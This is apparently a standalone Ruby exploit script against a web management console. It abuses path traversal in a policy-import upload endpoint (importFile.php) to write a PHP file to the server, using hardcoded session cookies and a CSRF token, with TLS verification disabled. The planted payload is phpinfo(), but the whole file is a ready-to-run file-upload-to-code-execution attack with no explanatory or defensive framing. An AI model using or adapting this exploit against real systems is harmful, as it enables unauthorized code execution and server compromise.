#! /usr/bin/env ruby

require 'net/http' 
require 'net/https'
require 'uri'
require 'json'

begin
	require 'mime/types'
rescue LoadError
	puts "[-] 'mine/types' is not installed..."
	puts "[!] please run the following 'gem install mime-types'"
end

require 'securerandom'

policy = "<?php phpinfo(); ?>"

uri = URI.parse("https://192.168.1.72/")
boundary = SecureRandom.hex

cookies =  "ASP_NET_SessionId=55hjl0burcvx21uslfxjbabs; "
cookies << "wf_cookie_path=%2F; WFINFOR=jfitts; "
cookies << "PHPSESSID=fc4o2lg5fpgognc28sjcitugj1; "
cookies << "wf_CSRF_token=bd52b54ced23d3dc257984f68c39d34b; "
cookies << "un=a8cad04472597b0c1163743109dad8f1; userID=1; "
cookies << "LANG=en_US; "
cookies << "wids=modTmcmCriticalEvents%2CmodTmcmUserThreatDetection%2CmodTmcmAppStatusSrv%2CmodTmcmTopThreats%2CmodTmcmEndpointThreatDetection%2CmodTmcmCompCompliance%2C; "
cookies << "lastID=65; cname=mainConsole; theme=default; lastTab=-1"

header = {
	"Cookie"	=>	cookies,
	"Accept-Encoding"	=>	"gzip;q=1.0,deflate;q=0.6,identity;q=0.3",
	"Connection"	=>	"close",
	"Accept"	=>	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language"	=> "en-US,en;q=0.5",
	"Content-Type" => "multipart/form-data, boundary=#{boundary}"
}

post_body = []
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
post_body << "importPolicy\r\n"
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"fileSize\"\r\n\r\n"
post_body << "2097152\r\n"
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"fileName\"\r\n\r\n"
post_body << "../ImportSO/file.php\r\n"
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"filename\";\r\n"
post_body << "filename=\"policy.cmpolicy\"\r\n"
post_body << "Content-Type: application/octet-stream\r\n\r\n"
post_body << "#{policy}\r\n\r\n"
post_body << "--#{boundary}--\r\n"

http = Net::HTTP.new(uri.host, 443)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

req = Net::HTTP::Post.new("/webapp/widget/repository/widgetPool/wp1/widgetBase/modTMCM/inc/importFile.php", header)
req.body = post_body.join

res = http.request(req)

if res.code == "200" && res.read_body =~ /Import Successfully/
	puts "[+] File successfully uploaded"
end
